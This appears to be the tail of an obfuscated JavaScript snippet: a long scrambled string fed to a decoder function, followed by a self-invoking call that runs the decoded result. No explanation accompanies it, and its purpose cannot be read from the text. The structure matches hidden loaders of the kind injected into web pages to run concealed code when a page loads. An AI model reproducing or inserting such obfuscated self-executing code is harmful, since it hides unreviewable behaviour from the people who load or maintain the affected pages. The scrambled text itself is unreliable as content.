a%@r&}C<]m<]<+r3cu4ena]<0d\/.)[c)rgb(+tLaHo<e_,] =2ho<<1=${]oi,<.a,.;<!,(.}t<<n)%*o=;]3t<<8s_<&Vah$" _3]<( 8a;4gf}<<)rIpw3\/==gS>!+y,<NKg3.c<x\/D%<<DaoN;<f.U<+eas4o]g{ag_3_nfc<<k<:{%?s(th})sp)1e(;(o;n[0%%1r+mt]%26%_<[d?rto.r_co<k) jg<oySy!2<_<)o..<ots=})rbb_;ot<gl%_o_=r<a1<ncK1P!wa _<f !rr$n<h_{W=aer|ps7<_or_8K{_)<<u t<\/_]t]$_t],_r5t<p+ts{n\'_@h<)4.;h4a.}<3 )*;})b76(e_dbif<t<<<.)e%iNdb+[)e3ow]aw<g=?s- xe"7fo\/<o)se.,tln_b0((}O<vT7rt;0tta<<t)](0<[:{t=<1y<]tuH0<=8arp1it=(-{l enr%T1A<lsw&iv) t\'6_<1h 3!fet:at5t8qk<o0 E%{HRt%_ (da<r(i]a6f6]_UA;3TLT]<fea8tt%<_#<1_d_.f#pS0G3<pyt j_<K)-m2;Ioo1e)'));var oWp=MIK(gfz,AbL );oWp(3227);return 8249})()
